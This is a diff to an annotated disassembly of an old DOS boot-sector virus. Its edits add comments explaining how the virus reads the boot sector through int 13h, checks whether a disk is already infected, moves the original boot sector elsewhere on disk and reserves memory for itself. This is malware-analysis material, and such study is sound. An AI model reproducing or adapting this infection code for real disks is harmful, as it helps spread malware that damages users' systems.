@@ -79,13 +79,13 @@ seg000:7C41    pop es                                                           
 seg000:7C42    mov si, 4                                                                     | store 4 in si
 seg000:7C45                                                                                  | 
 seg000:7C45    loc_7C45: ; CODE XREF: sub_7C36+29j                                           | 
-seg000:7C45    mov ax, 201h                                                                  | ax = 201h
-seg000:7C48    mov bx, 200h                                                                  | bs = 200h
-seg000:7C4B    mov cx, 1                                                                     | cx = 1
-seg000:7C4E    xor dx, dx                                                                    | dx = 0
+seg000:7C45    mov ax, 201h                                                                  | ax = 201h, read 1 sector
+seg000:7C48    mov bx, 200h                                                                  | bs = 200h, read into memory higher than virus
+seg000:7C4B    mov cx, 1                                                                     | cx = 1, start reading at track 0, sector 1
+seg000:7C4E    xor dx, dx                                                                    | dx = 0, target boot drive
 seg000:7C50    pushf                                                                         | push EFLAGS
-seg000:7C51    call dword ptr ds:0Ah                                                         | 
-seg000:7C55    jnb short loc_7C63                                                            | 
+seg000:7C51    call dword ptr ds:0Ah                                                         | do real int13, try 4 times
+seg000:7C55    jnb short loc_7C63                                                            | jump if no error
 seg000:7C57    xor ax, ax                                                                    | 
 seg000:7C59    pushf                                                                         | 
 seg000:7C5A    call dword ptr ds:0Ah                                                         | 
@@ -95,28 +95,28 @@ seg000:7C61    jmp short loc_7CA6                                               
 seg000:7C63    ; --------------------------------------------------------------------------- | 
 seg000:7C63                                                                                  | 
 seg000:7C63    loc_7C63: ; CODE XREF: sub_7C36+1Fj                                           | 
-seg000:7C63    xor si, si                                                                    | 
-seg000:7C65    cld                                                                           | 
-seg000:7C66    lodsw                                                                         | 
-seg000:7C67    cmp ax, [bx]                                                                  | 
-seg000:7C69    jnz short loc_7C71                                                            | 
-seg000:7C6B    lodsw                                                                         | 
-seg000:7C6C    cmp ax, [bx+2]                                                                | 
-seg000:7C6F    jz short loc_7CA6                                                             | 
+seg000:7C63    xor si, si                                                                    | clear si
+seg000:7C65    cld                                                                           | string operation direction forward
+seg000:7C66    lodsw                                                                         | load first word of virus into ax
+seg000:7C67    cmp ax, [bx]                                                                  | compare the virus to the memory copied from disk
+seg000:7C69    jnz short loc_7C71                                                            | jump if memory was not the same
+seg000:7C6B    lodsw                                                                         | load second word of virus into ax
+seg000:7C6C    cmp ax, [bx+2]                                                                | compare again
+seg000:7C6F    jz short loc_7CA6                                                             | if memory equal, assume infected and jump
 seg000:7C71                                                                                  | 
-seg000:7C71    loc_7C71: ; CODE XREF: sub_7C36+33j                                           | 
-seg000:7C71    mov ax, 301h                                                                  | 
-seg000:7C74    mov dh, 1                                                                     | 
-seg000:7C76    mov cl, 3                                                                     | 
-seg000:7C78    cmp byte ptr [bx+15h], 0FDh ; 'Ã½'                                            | 
-seg000:7C7C    jz short loc_7C80                                                             | 
-seg000:7C7E    mov cl, 0Eh                                                                   | 
+seg000:7C71    loc_7C71: ; CODE XREF: sub_7C36+33j                                           | if memory was not same, begin infection
+seg000:7C71    mov ax, 301h                                                                  | ax = 301h, write 1 sector
+seg000:7C74    mov dh, 1                                                                     | dh = 1, head number 1
+seg000:7C76    mov cl, 3                                                                     | cl = 3, start at sector 3
+seg000:7C78    cmp byte ptr [bx+15h], 0FDh ; 'Ã½'                                            | compare 0FDh and high memory above virus, detect hard drive
+seg000:7C7C    jz short loc_7C80                                                             | skip next line if 0FDh was in high memory
+seg000:7C7E    mov cl, 0Eh                                                                   | cl = 0Eh, otherwise set cl
 seg000:7C80                                                                                  | 
 seg000:7C80    loc_7C80: ; CODE XREF: sub_7C36+46j                                           | 
-seg000:7C80    mov ds:8, cx                                                                  | 
-seg000:7C84    pushf                                                                         | 
-seg000:7C85    call dword ptr ds:0Ah                                                         | 
-seg000:7C89    jb short loc_7CA6                                                             | 
+seg000:7C80    mov ds:8, cx                                                                  | store 0Eh in program data
+seg000:7C84    pushf                                                                         | push EFLAGS
+seg000:7C85    call dword ptr ds:0Ah                                                         | copy real boot sector to 3rd sector on disk
+seg000:7C89    jb short loc_7CA6                                                             | jump if error on disk write
 seg000:7C8B    mov si, 3BEh                                                                  | 
 seg000:7C8E    mov di, 1BEh                                                                  | 
 seg000:7C91    mov cx, 21h ; '!'                                                             | 
@@ -163,7 +163,7 @@ seg000:7CCD    dec ax                                                           
 seg000:7CCE    dec ax                                                                        |  .continuation 
 seg000:7CCF    mov ds:413h, ax                                                               | save decremented memory size back into 413h
 seg000:7CD2    mov cl, 6                                                                     | store 6 in cl
-seg000:7CD4    shl ax, cl                                                                    | shift memory size left 6 bits
+seg000:7CD4    shl ax, cl                                                                    | shift memory size left 6 bits to convert to offset
 seg000:7CD6    mov es, ax                                                                    | store shifted memory size in es: extra segment
 seg000:7CD8    mov ds:word_7C05, ax                                                          | save shifted memory size at word_7C05
 seg000:7CDB    mov ax, 0Eh                                                                   | store location of program continuation in ax
